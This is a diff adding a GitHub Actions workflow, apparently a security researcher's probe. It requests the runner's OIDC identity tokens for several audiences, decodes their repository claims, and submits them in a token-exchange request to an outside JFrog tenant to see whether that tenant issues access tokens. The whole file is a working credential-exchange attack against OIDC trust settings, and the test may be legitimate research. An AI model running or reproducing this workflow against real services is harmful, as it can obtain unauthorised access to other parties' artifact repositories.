@@ -1,0 +1,20 @@
+name: r31app
+on:
+  push:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          for A in jfrog-github default https://github.com/sanhacks2; do
+            if [ "$A" = default ]; then U="$ACTIONS_ID_TOKEN_REQUEST_URL"; else U="$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$A"; fi
+            T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$U" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+            echo "### aud=$A claims:"
+            echo "$T" | python3 -c 'import sys,json,base64;p=sys.stdin.read().split(".")[1];p+="="*(-len(p)%4);d=json.loads(base64.urlsafe_b64decode(p));print({k:d.get(k) for k in ("aud","repository","repository_id","repository_owner","repository_owner_id")})'
+            curl -s -o /tmp/o -w 'HTTP %{http_code}\n' -X POST -H 'Content-Type: application/json' -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:id_token\",\"subject_token\":\"$T\",\"provider_name\":\"sanhacks2/x\"}" https://trialuakwcj.jfrog.io/access/api/v1/oidc/token || true
+            python3 -c 'import json,base64;b=open("/tmp/o").read();d=json.loads(b) if b.startswith("{") else {};t=d.get("access_token");p=(t.split(".")[1]+"==") if t else "";c=json.loads(base64.urlsafe_b64decode(p)) if t else {};print("JFROG sub=",c.get("sub"),"scp=",c.get("scp")) if t else print("BODY",b[:300])' || true
+          done
